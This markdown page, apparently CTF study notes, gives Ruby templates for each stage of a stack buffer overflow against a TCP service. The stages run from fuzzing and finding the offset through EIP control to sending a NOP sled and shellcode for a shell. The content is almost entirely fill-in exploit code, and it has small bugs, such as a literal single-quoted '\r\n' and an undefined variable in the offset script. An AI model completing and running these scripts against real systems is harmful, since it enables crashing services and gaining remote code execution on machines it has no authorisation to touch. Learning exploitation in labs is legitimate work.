
### Ruby Templates for BOF

There are different stages of BOF and we'll have different scripts for each stage:

### Spiking & Fuzzing
```Ruby
require 'socket'

buff = "A" * 100
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

begin
    while true
        s = TCPSocket.open(RHOST, RPORT)
        s.puts buff + '\r\n'
        s.close
        sleep 1
        buffSize = buff.size
        buff += "A" * 100
    end
rescue Interrupt
    puts "Debugger crashed at #{buffSize} bytes"
end
```
### Finding Offset
```Ruby
require 'socket'

buff = #Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

begin
    s = TCPSocket.open(RHOST, RPORT)
    s.puts buff + '\r\n'
    s.close
rescue Interrupt
    puts "Debugger crashed at #{buffSize} bytes"
end
```    
### Overwriting EIP
```Ruby
buff = #Based on the offset bytes, place your pattern here 
buff += "B" * 4
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

require 'socket'

TCPSocket.open(RHOST,RPORT){ |s| s.puts buff + '\r\n'}
```
### Owning EIP
```Ruby
buff = "A" * (Offset Value)
buff += #Address of EIP
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

require 'socket'

TCPSocket.open(RHOST,RPORT){ |s| s.puts buff + '\r\n'}
```
### Getting a Shell
```Ruby
shellcode = #Place your shellcode here
buff = "A" * (Offset Value)
buff += #Address of EIP 
buff += "\x90" * (8/10/12/16/20...) 
buff += shellcode
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

require 'socket'

TCPSocket.open(RHOST,RPORT){ |s| s.puts buff + '\r\n'}
```
[<= Go Back to Gatekeeper Menu](GatekeeperMain.md)

[<= Go Back to BOF Menu](BOFMain.md)

[<= Go Back to Main Menu](index.md)
